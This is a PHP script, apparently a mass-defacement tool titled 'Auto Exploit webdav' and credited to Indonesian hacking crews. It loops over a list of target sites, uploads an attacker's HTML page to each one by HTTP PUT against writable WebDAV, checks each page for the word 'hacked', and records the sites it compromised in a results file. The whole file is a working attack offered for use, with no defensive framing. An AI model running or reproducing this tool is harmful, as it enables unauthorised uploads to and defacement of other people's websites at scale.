<?php
/**
 * Auto Exploit webdav
 * ReCoded : galehdotid
 * thx   : Indoxploit - tu5b0l3d - xaisyndicate - all indonesia Hacker Rulez
 * Open Result result-webdav.txt !
 * Usage :  Usage : php webdav.php list.txt hack.html
 */ 
error_reporting(0);
class webdav{
    function exploit($site, $filesize, $fp){
    	$ch = curl_init();
    	$options = [
    		CURLOPT_URL => $site,
    		CURLOPT_FOLLOWLOCATION => TRUE,
    		CURLOPT_RETURNTRANSFER => TRUE,
    		CURLOPT_USERAGENT => "Mozilla/5.0 (X11; Linux x86_64; rv:24.0) Gecko/20140722 Firefox/24.0 Iceweasel/24.7.0",
    		CURLOPT_PUT => TRUE,
    		CURLOPT_INFILE => $fp,
    		CURLOPT_INFILESIZE => $filesize,
    		CURLOPT_COOKIEJAR => "cookie_jar.txt",
    		CURLOPT_COOKIEFILE => "cookie_file.txt"
    	];
    	curl_setopt_array($ch, $options);
    	$ekse = curl_exec($ch);
        echo "[*] $site \n";
        $ngecek = $this->ngecek($site);
          if(preg_match("/hacked/i", $ngecek)){
          	echo "[+] Sukses Exploit\n\n";
          	$this->ngesave($site);
          }else{
          	echo "[-] gagal exploit\n\n";
          }
        return $ekse;

    }
    function ngecek($site){
    	$ch = curl_init();
    	$options = [
    		CURLOPT_URL => $site,
            CURLOPT_RETURNTRANSFER => TRUE,
            CURLOPT_FOLLOWLOCATION => TRUE,
            CURLOPT_USERAGENT => "Mozilla/5.0 (X11; Linux x86_64; rv:24.0) Gecko/20140722 Firefox/24.0 Iceweasel/24.7.0",
            CURLOPT_SSL_VERIFYPEER => FALSE,
            CURLOPT_SSL_VERIFYHOST => FALSE,
            CURLOPT_COOKIEJAR => "cookie_jar.txt",
    		CURLOPT_COOKIEFILE => "cookie_file.txt"
    	];
    	curl_setopt_array($ch, $options);
    	$ekse = curl_exec($ch);
    	return $ekse;
    }
    function ngesave($site){
    	$file = @fopen("result-webdav.txt", "a");
    	        @fwrite($file, $site . "\r\n");
    	        @fclose($file);
    }
}

$Xploit = new webdav();
  if(!($argv[1]) && !($argv[2])){
  	 echo "Usage : php webdav.php list.txt hack.html";
  }else{
  	$sites = $argv[1];
	$file = $argv[2];
	$fp = fopen($file, "r");
	$buka=fopen("$sites","r");
	$filesize = filesize($file);
	$size=filesize("$sites");
	$baca=fread($buka,$size);
	$sites = explode("\r\n", $baca);
	  foreach ($sites as $site) {
	  	  if(preg_match("#http://#", $site)){
	  	  	  $site = $site;
	  	  }else{
	  	  	$site = "http://".$site;
	  	  }
	  	  $site = "$site/$file";
	  	   $Xploit->exploit($site, $filesize, $fp);
	  }
  }

?>